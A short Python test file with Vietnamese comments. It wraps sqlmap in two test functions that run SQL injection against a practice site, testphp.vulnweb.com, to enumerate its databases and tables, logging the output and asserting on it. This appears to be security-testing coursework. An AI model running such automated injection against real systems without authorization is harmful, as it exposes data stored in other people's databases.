import os
import subprocess

# Mở file log để ghi kết quả vào
def test_sql_injection_db():
    # Xác định đường dẫn đến thư mục logs
    log_folder = "E://Tai xuong//GroupTQ//Source//logs"
    # Tạo thư mục logs nếu chưa tồn tại
    os.makedirs(log_folder, exist_ok=True)
    log_file_path = os.path.join(log_folder, f'sqlmap1.log')
    with open(log_file_path, 'w') as log_file:
        # Thực hiện kiểm thử SQL Injection bằng sqlmap và ghi log
        result = subprocess.run(
            ['py', 'C:\\sqlmap\\sqlmap.py', '-u', 'http://testphp.vulnweb.com/listproducts.php?cat=1', '--dbs', "--batch"],
            capture_output=True, text=True)
        log_file.write(result.stdout)
        assert "the back-end DBMS is" in result.stdout
        print("The back_end DBMS was found")


def test_sql_injection_tables():
    # Xác định đường dẫn đến thư mục logs
    log_folder = "E://Tai xuong//GroupTQ//Source//logs"
    # Tạo thư mục logs nếu chưa tồn tại
    os.makedirs(log_folder, exist_ok=True)
    log_file_path = os.path.join(log_folder, f'sqlmap2.log')
    with open(log_file_path, 'w') as log_file:
        # Thực hiện kiểm thử SQL Injection bằng sqlmap và ghi log
        result = subprocess.run(
            ['py', 'C:\\sqlmap\\sqlmap.py', '-u', 'http://testphp.vulnweb.com/listproducts.php?cat=1', '--tables', "--batch"],
            capture_output=True, text=True)
        log_file.write(result.stdout)
        assert "fetching tables for databases: " in result.stdout
        print("tables in the DBMS have been found")

#Khi đặt capture_output=True, các dữ liệu đầu ra từ quá trình con sẽ được lưu trữ trong thuộc tính stdout